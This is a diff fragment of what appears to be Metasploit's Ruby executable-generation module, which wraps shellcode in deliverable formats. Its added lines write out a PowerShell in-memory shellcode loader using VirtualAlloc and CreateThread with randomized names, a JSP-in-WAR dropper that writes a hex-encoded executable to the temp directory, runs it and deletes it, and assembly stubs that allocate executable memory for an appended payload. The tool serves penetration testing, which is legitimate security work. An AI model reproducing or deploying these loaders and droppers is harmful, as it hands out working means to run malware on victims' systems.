+    var_win32_func = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_payload = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_size = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_rwx = Rex::Text.rand_text_alpha(rand(3)+2)
+    var_iter = Rex::Text.rand_text_alpha(rand(3)+2)
 
-    return read_replace_script_template("to_mem_old.ps1.template", hash_sub).gsub(/(?<!\r)\n/, "\r\n")
+    # Add wrapper script
+    psh = "$#{var_code} = @\"\r\n"
+    psh << "[DllImport(\"kernel32.dll\")]\r\n"
+    psh << "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\r\n"
+    psh << "[DllImport(\"kernel32.dll\")]\r\n"
+    psh << "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\r\n"
+    psh << "[DllImport(\"msvcrt.dll\")]\r\n"
+    psh << "public static extern IntPtr memset(IntPtr dest, uint src, uint count);\r\n"
+    psh << "\"@\r\n"
+    psh << "$#{var_win32_func} = Add-Type -memberDefinition $#{var_code} -Name \"Win32\" -namespace Win32Functions -passthru\r\n"
+    # Set up the payload string, see psh_net for formatting reason
+    psh << "[Byte[]]$#{var_code} = #{Rex::Text.to_hex(code).gsub('\x',',0x')[1..-1]}\r\n"
+    psh << "$#{var_size} = 0x1000\r\n"
+    psh << "if ($#{var_payload}.Length -gt 0x1000) {$#{var_size} = $#{var_payload}.Length}\r\n"
+    psh << "$#{var_rwx}=$#{var_win32_func}::VirtualAlloc(0,0x1000,$#{var_size},0x40)\r\n"
+    psh << "for ($#{var_iter}=0;$#{var_iter} -le ($#{var_payload}.Length-1);$#{var_iter}++) {$#{var_win32_func}::memset([IntPtr]($#{var_rwx}.ToInt32()+$#{var_iter}), $#{var_payload}[$#{var_iter}], 1)}\r\n"
+    psh << "$#{var_win32_func}::CreateThread(0,0,$#{var_rwx},0,0,0)\r\n"
+
+
   end
 
   def self.to_win32pe_vbs(framework, code, opts={})
     to_exe_vbs(to_win32pe(framework, code, opts), opts)
+  end
+
+  def self.to_win32pe_asp(framework, code, opts={})
+    to_exe_asp(to_win32pe(framework, code, opts), opts)
+  end
+
+  def self.to_win32pe_aspx(framework, code, opts={})
+    to_exe_aspx(to_win32pe(framework, code, opts), opts)
   end
 
   # Creates a jar file that drops the provided +exe+ into a random file name
@@ -927,7 +1214,7 @@ def self.to_vba(framework,code,opts={})
     web_xml.gsub!(/PAYLOAD/, jsp_name)
 
     zip = Rex::Zip::Archive.new
-    zip.add_file('META-INF/', '', meta_inf)
+    zip.add_file('META-INF/', nil, meta_inf)
     zip.add_file('META-INF/MANIFEST.MF', manifest)
     zip.add_file('WEB-INF/', '')
     zip.add_file('WEB-INF/web.xml', web_xml)
@@ -956,24 +1243,73 @@ def self.to_vba(framework,code,opts={})
   def self.to_jsp_war(exe, opts={})
 
     # begin <payload>.jsp
-    hash_sub = {}
-    hash_sub[:var_hexpath]       = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_exepath]       = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_data]          = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_inputstream]   = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_outputstream]  = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_numbytes]      = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_bytearray]     = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_bytes]         = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_counter]       = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_char1]         = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_char2]         = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_comb]          = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_exe]           = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_hexfile]       = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_proc]          = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_fperm]         = Rex::Text.rand_text_alpha(rand(8)+8)
-    hash_sub[:var_fdel]          = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_hexpath       = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_exepath       = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_data          = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_inputstream   = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_outputstream  = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_numbytes      = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_bytearray     = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_bytes         = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_counter       = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_char1         = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_char2         = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_comb          = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_exe           = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_hexfile       = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_proc          = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_fperm         = Rex::Text.rand_text_alpha(rand(8)+8)
+    var_fdel          = Rex::Text.rand_text_alpha(rand(8)+8)
+
+    jspraw =  "<%@ page import=\"java.io.*\" %>\n"
+    jspraw << "<%\n"
+    jspraw << "String #{var_hexpath} = application.getRealPath(\"/\") + \"/#{var_hexfile}.txt\";\n"
+    jspraw << "String #{var_exepath} = System.getProperty(\"java.io.tmpdir\") + \"/#{var_exe}\";\n"
+    jspraw << "String #{var_data} = \"\";\n"
+
+    jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
+    jspraw << "#{var_exepath} = #{var_exepath}.concat(\".exe\");\n"
+    jspraw << "}\n"
+
+    jspraw << "FileInputStream #{var_inputstream} = new FileInputStream(#{var_hexpath});\n"
+    jspraw << "FileOutputStream #{var_outputstream} = new FileOutputStream(#{var_exepath});\n"
+
+    jspraw << "int #{var_numbytes} = #{var_inputstream}.available();\n"
+    jspraw << "byte #{var_bytearray}[] = new byte[#{var_numbytes}];\n"
+    jspraw << "#{var_inputstream}.read(#{var_bytearray});\n"
+    jspraw << "#{var_inputstream}.close();\n"
+
+    jspraw << "byte[] #{var_bytes} = new byte[#{var_numbytes}/2];\n"
+    jspraw << "for (int #{var_counter} = 0; #{var_counter} < #{var_numbytes}; #{var_counter} += 2)\n"
+    jspraw << "{\n"
+    jspraw << "char #{var_char1} = (char) #{var_bytearray}[#{var_counter}];\n"
+    jspraw << "char #{var_char2} = (char) #{var_bytearray}[#{var_counter} + 1];\n"
+    jspraw << "int #{var_comb} = Character.digit(#{var_char1}, 16) & 0xff;\n"
+    jspraw << "#{var_comb} <<= 4;\n"
+    jspraw << "#{var_comb} += Character.digit(#{var_char2}, 16) & 0xff;\n"
+    jspraw << "#{var_bytes}[#{var_counter}/2] = (byte)#{var_comb};\n"
+    jspraw << "}\n"
+
+    jspraw << "#{var_outputstream}.write(#{var_bytes});\n"
+    jspraw << "#{var_outputstream}.close();\n"
+
+    jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1){\n"
+    jspraw << "String[] #{var_fperm} = new String[3];\n"
+    jspraw << "#{var_fperm}[0] = \"chmod\";\n"
+    jspraw << "#{var_fperm}[1] = \"+x\";\n"
+    jspraw << "#{var_fperm}[2] = #{var_exepath};\n"
+    jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_fperm});\n"
+    jspraw << "if (#{var_proc}.waitFor() == 0) {\n"
+    jspraw << "#{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
+    jspraw << "}\n"
+    # Linux and other UNICES allow removing files while they are in use...
+    jspraw << "File #{var_fdel} = new File(#{var_exepath}); #{var_fdel}.delete();\n"
+    jspraw << "} else {\n"
+    # Windows does not ..
+    jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
+    jspraw << "}\n"
+
+    jspraw << "%>\n"
 
     # Specify the payload in hex as an extra file..
     payload_hex = exe.unpack('H*')[0]
@@ -981,14 +1317,13 @@ def self.to_vba(framework,code,opts={})
       {
         :extra_files =>
           [
-            [ "#{hash_sub[:var_hexfile]}.txt", payload_hex ]
+            [ "#{var_hexfile}.txt", payload_hex ]
           ]
       })
 
-    template = read_replace_script_template("to_exe_jsp.war.template", hash_sub)
-
-    return self.to_war(template, opts)
+    return self.to_war(jspraw, opts)
   end
+
 
   # Creates a .NET DLL which loads data into memory
   # at a specified location with read/execute permissions
@@ -1075,10 +1410,11 @@ def self.to_vba(framework,code,opts={})
     api_call:
       pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
       mov ebp, esp           ; Create a new stack frame
-      xor edx, edx           ; Zero EDX
-      mov edx, [fs:edx+48]   ; Get a pointer to the PEB
-      mov edx, [edx+12]      ; Get PEB->Ldr
-      mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
+      xor eax, eax           ; Zero EDX
+      mov eax, [fs:eax+48]   ; Get a pointer to the PEB
+      mov eax, [eax+12]      ; Get PEB->Ldr
+      mov eax, [eax+20]      ; Get the first module from the InMemoryOrder module list
+      mov edx, eax
     next_mod:                ;
       mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
       movzx ecx, word [edx+38] ; Set ECX to the length we want to check
@@ -1092,13 +1428,8 @@ def self.to_vba(framework,code,opts={})
     not_lowercase:           ;
       ror edi, 13            ; Rotate right our hash value
       add edi, eax           ; Add the next byte of the name
-      ;loop loop_modname      ; Loop until we have read enough
-      ; The random jmps added below will occasionally make this offset
-      ; greater than will fit in a byte, so we have to use a regular jnz
-      ; instruction which can take a full 32-bits to accomodate the
-      ; bigger offset
       dec ecx
-      jnz loop_modname        ; Loop until we have read enough
+      jnz loop_modname      ; Loop untill we have read enough
       ; We now have the module hash computed
       push edx               ; Save the current position in the module list for later
       push edi               ; Save the current module hash for later
@@ -1116,7 +1447,7 @@ def self.to_vba(framework,code,opts={})
       add ebx, edx           ; Add the modules base address
       ; Computing the module hash + function hash
     get_next_func:           ;
-      test ecx, ecx          ; Changed from jecxz to accomodate the larger offset produced by random jmps below
+      test ecx, ecx          ; (Changed from JECXZ to work around METASM)
       jz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
       dec ecx                ; Decrement the function name counter
       mov esi, [ebx+ecx*4]   ; Get rva of next module name
@@ -1159,7 +1490,7 @@ def self.to_vba(framework,code,opts={})
       pop edi                ; Pop off the current (now the previous) modules hash
       pop edx                ; Restore our position in the module list
       mov edx, [edx]         ; Get the next module
-      jmp next_mod           ; Process this module
+      jmp next_mod     ; Process this module
     ^
 
     stub_exit = %Q^
@@ -1192,7 +1523,7 @@ def self.to_vba(framework,code,opts={})
       pop ebp                ; Pop off the address of 'api_call' for calling later.
 
     allocate_size:
-       mov esi, #{code.length}
+       mov esi,PAYLOAD_SIZE
 
     allocate:
       push byte 0x40         ; PAGE_EXECUTE_READWRITE
@@ -1225,8 +1556,9 @@ def self.to_vba(framework,code,opts={})
     get_payload:
       call got_payload
     payload:
-    ; Append an arbitrary payload here
+    ; Append an arbitary payload here
     ^
+
 
     stub_alloc.gsub!('short', '')
     stub_alloc.gsub!('byte', '')
@@ -1258,8 +1590,10 @@ def self.to_vba(framework,code,opts={})
     wrapper << stub_final
 
     enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
+    off = enc.offset_of_reloc('PAYLOAD_SIZE')
     res = enc.data + code
 
+    res[off,4] = [code.length].pack('V')
     res
   end
 
@@ -1298,11 +1632,12 @@ def self.to_vba(framework,code,opts={})
     not_lowercase:           ;
       ror edi, 13            ; Rotate right our hash value
       add edi, eax           ; Add the next byte of the name
-      loop loop_modname      ; Loop until we have read enough
+      dec ecx
+      jnz loop_modname      ; Loop untill we have read enough
       ; We now have the module hash computed
       push edx               ; Save the current position in the module list for later
       push edi               ; Save the current module hash for later
-      ; Proceed to iterate the export address table,
+      ; Proceed to itterate the export address table,
       mov edx, [edx+16]      ; Get this modules base address
       mov eax, [edx+60]      ; Get PE header
       add eax, edx           ; Add the modules base address
@@ -1358,7 +1693,7 @@ def self.to_vba(framework,code,opts={})
       pop edi                ; Pop off the current (now the previous) modules hash
       pop edx                ; Restore our position in the module list
       mov edx, [edx]         ; Get the next module
-      jmp next_mod           ; Process this module
+      jmp next_mod     ; Process this module
     ^
 
     stub_exit = %Q^
@@ -1392,7 +1727,7 @@ def self.to_vba(framework,code,opts={})
       pop ebp                ; Pop off the address of 'api_call' for calling later.
 
     allocate_size:
-       mov esi,#{code.length}
+       mov esi,PAYLOAD_SIZE
 
     allocate:
       push byte 0x40         ; PAGE_EXECUTE_READWRITE
@@ -1438,7 +1773,7 @@ def self.to_vba(framework,code,opts={})
     get_payload:
       call got_payload
     payload:
-    ; Append an arbitrary payload here
+    ; Append an arbitary payload here
     ^
 
 
@@ -1480,9 +1815,11 @@ def self.to_vba(framework,code,opts={})
     wrapper << stub_final
 
     enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
+    off = enc.offset_of_reloc('PAYLOAD_SIZE')
     soff = enc.data.index("\xe9\xff\xff\xff\xff") + 1
     res = enc.data + code
 
+    res[off,4] = [code.length].pack('V')
     if which_offset == 'start'
       res[soff,4] = [block_offset - (soff + 4)].pack('V')
     elsif which_offset == 'end'
@@ -1495,121 +1832,87 @@ def self.to_vba(framework,code,opts={})
 
 
   #
-  # Generate an executable of a given format suitable for running on the
-  # architecture/platform pair.
+  # This routine is shared between msfencode, rpc, and payload modules (use <payload>)
   #
-  # This routine is shared between msfencode, rpc, and payload modules (use
-  # <payload>)
+  # It will return nil if it wasn't able to generate any output.
   #
-  # @param framework [Framework]
-  # @param arch [String] Architecture for the target format; one of the ARCH_*
-  # constants
-  # @param plat [#index] platform
-  # @param code [String] The shellcode for the resulting executable to run
-  # @param fmt [String] One of the executable formats as defined in
-  #   {.to_executable_fmt_formats}
-  # @param exeopts [Hash] Passed directly to the approrpriate method for
-  #   generating an executable for the given +arch+/+plat+ pair.
-  # @return [String] An executable appropriate for the given
-  #   architecture/platform pair.
-  # @return [nil] If the format is unrecognized or the arch and plat don't
-  #   make sense together.
   def self.to_executable_fmt(framework, arch, plat, code, fmt, exeopts)
-    # For backwards compatibility with the way this gets called when
-    # generating from Msf::Simple::Payload.generate_simple
-    if arch.kind_of? Array
-      output = nil
-      arch.each do |a|
-        output = to_executable_fmt(framework, a, plat, code, fmt, exeopts)
-        break if output
-      end
-      return output
-    end
+
+    output = nil
 
     case fmt
-    when 'asp'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-      output = Msf::Util::EXE.to_exe_asp(exe, exeopts)
-
-    when 'aspx'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-      output = Msf::Util::EXE.to_exe_aspx(exe, exeopts)
-
     when 'dll'
-      output = case arch
-        when ARCH_X86,nil then to_win32pe_dll(framework, code, exeopts)
-        when ARCH_X86_64  then to_win64pe_dll(framework, code, exeopts)
-        when ARCH_X64     then to_win64pe_dll(framework, code, exeopts)
-        end
-    when 'exe'
-      output = case arch
-        when ARCH_X86,nil then to_win32pe(framework, code, exeopts)
-        when ARCH_X86_64  then to_win64pe(framework, code, exeopts)
-        when ARCH_X64     then to_win64pe(framework, code, exeopts)
-        end
+      if (not arch or (arch.index(ARCH_X86)))
+        output = Msf::Util::EXE.to_win32pe_dll(framework, code, exeopts)
+      end
 
-    when 'exe-service'
-      output = case arch
-        when ARCH_X86,nil then to_win32pe_service(framework, code, exeopts)
-        when ARCH_X86_64  then to_win64pe_service(framework, code, exeopts)
-        when ARCH_X64     then to_win64pe_service(framework, code, exeopts)
+      if(arch and (arch.index( ARCH_X86_64 ) or arch.index( ARCH_X64 )))
+        output = Msf::Util::EXE.to_win64pe_dll(framework, code, exeopts)
+      end
+
+    when 'exe'
+      if (not arch or (arch.index(ARCH_X86)))
+        output = Msf::Util::EXE.to_win32pe(framework, code, exeopts)
+      end
+
+      if(arch and (arch.index( ARCH_X86_64 ) or arch.index( ARCH_X64 )))
+        output = Msf::Util::EXE.to_win64pe(framework, code, exeopts)
       end
 
     when 'exe-small'
-      output = case arch
-        when ARCH_X86,nil then to_win32pe_old(framework, code, exeopts)
-        end
+      if(not arch or (arch.index(ARCH_X86)))
+        output = Msf::Util::EXE.to_win32pe_old(framework, code, exeopts)
+      end
 
     when 'exe-only'
-      output = case arch
-        when ARCH_X86,nil then to_winpe_only(framework, code, exeopts, arch)
-        when ARCH_X86_64  then to_winpe_only(framework, code, exeopts, arch)
-        when ARCH_X64     then to_winpe_only(framework, code, exeopts, arch)
-        end
+      if(not arch or (arch.index(ARCH_X86)))
+        output = Msf::Util::EXE.to_win32pe_only(framework, code, exeopts)
+      end
 
     when 'elf'
       if (not plat or (plat.index(Msf::Module::Platform::Linux)))
-        output = case arch
-          when ARCH_X86,nil then to_linux_x86_elf(framework, code, exeopts)
-          when ARCH_X86_64  then to_linux_x64_elf(framework, code, exeopts)
-          when ARCH_X64     then to_linux_x64_elf(framework, code, exeopts)
-          when ARCH_ARMLE   then to_linux_armle_elf(framework, code, exeopts)
-          when ARCH_MIPSBE  then to_linux_mipsbe_elf(framework, code, exeopts)
-          when ARCH_MIPSLE  then to_linux_mipsle_elf(framework, code, exeopts)
-          end
+        if (not arch or (arch.index(ARCH_X86)))
+          output = Msf::Util::EXE.to_linux_x86_elf(framework, code, exeopts)
+        elsif (arch and (arch.index( ARCH_X86_64 ) or arch.index( ARCH_X64 )))
+          output = Msf::Util::EXE.to_linux_x64_elf(framework, code, exeopts)
+        end
       elsif(plat and (plat.index(Msf::Module::Platform::BSD)))
-        output = case arch
-          when ARCH_X86,nil then Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
-          end
+        if (not arch or (arch.index(ARCH_X86)))
+          output = Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
+        end
       elsif(plat and (plat.index(Msf::Module::Platform::Solaris)))
-        output = case arch
-          when ARCH_X86,nil then to_solaris_x86_elf(framework, code, exeopts)
-          end
+        if (not arch or (arch.index(ARCH_X86)))
+          output = Msf::Util::EXE.to_solaris_x86_elf(framework, code, exeopts)
+        end
       end
 
     when 'macho'
-      output = case arch
-        when ARCH_X86,nil then to_osx_x86_macho(framework, code, exeopts)
-        when ARCH_X86_64  then to_osx_x64_macho(framework, code, exeopts)
-        when ARCH_X64     then to_osx_x64_macho(framework, code, exeopts)
-        when ARCH_ARMLE   then to_osx_arm_macho(framework, code, exeopts)
-        when ARCH_PPC     then to_osx_ppc_macho(framework, code, exeopts)
-        end
+      if (not arch or (arch.index(ARCH_X86)))
+        output = Msf::Util::EXE.to_osx_x86_macho(framework, code, exeopts)
+      end
+
+      if (arch and (arch.index(ARCH_X86_64) or arch.index(ARCH_X64)))
+        output = Msf::Util::EXE.to_osx_x64_macho(framework, code, exeopts)
+      end
 
     when 'vba'
       output = Msf::Util::EXE.to_vba(framework, code, exeopts)
 
     when 'vba-exe'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
+      exe = Msf::Util::EXE.to_win32pe(framework, code, exeopts)
       output = Msf::Util::EXE.to_exe_vba(exe)
 
     when 'vbs'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-      output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => false }))
+      output = Msf::Util::EXE.to_win32pe_vbs(framework, code, exeopts.merge({ :persist => false }))
 
     when 'loop-vbs'
-      exe = exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
-      output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => true }))
+      output = Msf::Util::EXE.to_win32pe_vbs(framework, code, exeopts.merge({ :persist => true }))
+
+    when 'asp'
+      output = Msf::Util::EXE.to_win32pe_asp(framework, code, exeopts)
+
+    when 'aspx'
+      output = Msf::Util::EXE.to_win32pe_aspx(framework, code, exeopts)
 
     when 'war'
       arch ||= [ ARCH_X86 ]
@@ -1630,10 +1933,7 @@ def self.to_vba(framework,code,opts={})
   end
 
   def self.to_executable_fmt_formats
-    [
-      'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
-      'vbs','loop-vbs','asp','aspx','war','psh','psh-net'
-    ]
+    ['dll','exe','exe-small','exe-only','elf','macho','vba','vba-exe','vbs','loop-vbs','asp','aspx','war','psh','psh-net']
   end
 
   #
